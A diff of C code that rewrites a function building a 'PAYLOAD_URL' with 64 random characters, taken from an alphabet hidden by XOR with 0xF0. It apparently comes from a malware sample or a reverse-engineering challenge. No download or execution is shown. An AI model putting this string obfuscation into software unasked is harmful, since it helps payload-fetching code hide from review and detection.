@@ -118,10 +118,11 @@ unsigned char *psswdPadding()
     return psswd;
 }
 
-char *formatURL(char *payload_url)
+char *formatURL()
 {
-    char currByte[4];
-    char *formattedURL = calloc(strlen(payload_url) + (64 * 3), 1);
+    char *alphaNums = "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9";
+    char *formattedURL = calloc(strlen(PAYLOAD_URL) + 65, 1);
+    int len = strlen(PAYLOAD_URL);
 
     if (formattedURL == NULL)
         return NULL;
@@ -130,9 +131,10 @@ char *formatURL(char *payload_url)
 
     for (int i = 0; i < 64; i++)
     {
-        sprintf(currByte, "%%%02X", rand() % 256);
-        strcat(formattedURL, currByte);
+        formattedURL[len] = alphaNums[rand() % 62] ^ 0xF0;
+        len++;
     }
+    formattedURL[len++] = '\0';
     puts(formattedURL);
     return formattedURL;
 }
